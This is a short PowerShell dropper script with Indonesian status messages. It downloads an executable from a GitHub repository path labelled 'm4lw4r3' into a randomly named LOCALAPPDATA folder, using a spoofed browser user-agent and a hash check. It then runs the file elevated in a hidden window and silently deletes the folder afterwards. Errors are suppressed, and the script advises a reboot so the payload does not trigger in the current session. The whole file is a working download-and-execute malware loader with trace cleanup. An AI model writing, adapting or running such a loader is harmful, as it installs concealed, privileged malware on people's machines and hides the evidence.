$ErrorActionPreference='SilentlyContinue'
try{[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12}catch{}
$B='https://raw.githubusercontent.com/adrianwiraw/yanrevenge/main/m4lw4r3/'
$T=Join-Path $env:LOCALAPPDATA ('y4nn_'+(-join (1..8|%{'0123456789abcdef'[(Get-Random -Maximum 16)]})))
New-Item -ItemType Directory $T -Force|Out-Null
$X="$T\y4nn.exe"
curl.exe -sS -L --retry 3 --retry-delay 1 -A 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)' -o $X ($B+'y4nn.exe')
if((Test-Path $X) -and (Get-FileHash $X -Algorithm SHA256).Hash.ToLower() -eq 'b51c89b84273150650897fff4cdc74b5e03a676e20b0b25a03158f245d00789b'){
  $up=[int]((Get-Date)-(Get-CimInstance Win32_OperatingSystem).LastBootUpTime).TotalMinutes
  Start-Process $X -Verb RunAs -WindowStyle Hidden
  Start-Process cmd -ArgumentList "/c timeout /t 12 /nobreak >nul & rmdir /s /q `"$T`"" -WindowStyle Hidden
  if($up -lt 6){ "ok — tapi uptime baru $up menit; restart sekali lagi supaya tidak terpicu di sesi ini" }
  else { "ok" }
}else{
  "gagal — ada=$(Test-Path $X) size=$(if(Test-Path $X){(Get-Item $X).Length}else{0}) hash=$(if(Test-Path $X){(Get-FileHash $X -Algorithm SHA256).Hash.ToLower()}else{'-'})"
}